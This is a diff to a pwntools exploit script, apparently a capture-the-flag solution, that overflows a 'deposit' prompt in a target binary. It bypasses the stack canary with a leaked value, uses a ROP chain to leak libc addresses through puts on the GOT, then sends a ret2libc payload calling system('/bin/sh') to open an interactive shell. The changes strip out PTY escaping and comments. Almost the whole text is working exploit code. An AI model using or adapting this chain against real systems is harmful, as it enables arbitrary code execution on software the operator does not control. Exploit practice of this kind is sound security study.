@@ -37,7 +37,7 @@ def main():
     log.success(f"PIE: {hex(exe.address)}")
     log.success(f"RBP: {hex(saved_rbp)}")
 
-    # Leak 2 functions (printf and read) to identify the Libc version on libc.rip
+    # Leak libc through 2 func printf and read
     r.sendlineafter(b"> ", b"3")
     
     rop = ROP(exe)
@@ -46,7 +46,7 @@ def main():
     
     payload = b"A" * 72
     payload += p64(canary)
-    payload += b"B" * 8 # Dummy saved_rbp to avoid \x7f (DEL) byte in PTY
+    payload += p64(saved_rbp)
     payload += p64(ret)
 
     # Gadget to call puts(printf@GOT)
@@ -59,11 +59,9 @@ def main():
     payload += p64(exe.got['read'])
     payload += p64(exe.plt['puts'])
 
-    payload += p64(exe.address + 0x1448) # Return to deposit()
+    payload += p64(exe.address + 0x1448)
 
-    payload_escaped = b"".join(bytes([0x16, b]) for b in payload)
-
-    r.sendlineafter(b"Amount to deposit: ", payload_escaped)
+    r.sendlineafter(b"Amount to deposit: ", payload)
 
     # Read leaked printf address
     r.recvline()
@@ -85,18 +83,17 @@ def main():
     libc_base = printf_leak - LIBC_OFFSET_PRINTF
     log.success(f"Libc base: {hex(libc_base)}")
 
-    # Ret2libc -> Ret2shellcode
-    ret = rop.find_gadget(['ret'])[0] 
+    # Ret2libc
+    ret = rop.find_gadget(['ret'])[0]
     
     payload2 = b"A" * 72
     payload2 += p64(canary)
-    payload2 += b"B" * 8
+    payload2 += p64(saved_rbp)
     payload2 += p64(pop_rdi)
     payload2 += p64(libc_base + LIBC_OFFSET_BINSH)
     payload2 += p64(libc_base + LIBC_OFFSET_SYSTEM)
 
-    payload2_escaped = b"".join(bytes([0x16, b]) for b in payload2)
-    r.sendafter(b"Amount to deposit: ", payload2_escaped + b"\n")
+    r.sendafter(b"Amount to deposit: ", payload2 + b"\n")
 
     log.success("Enjoy your shell!")
     r.interactive()
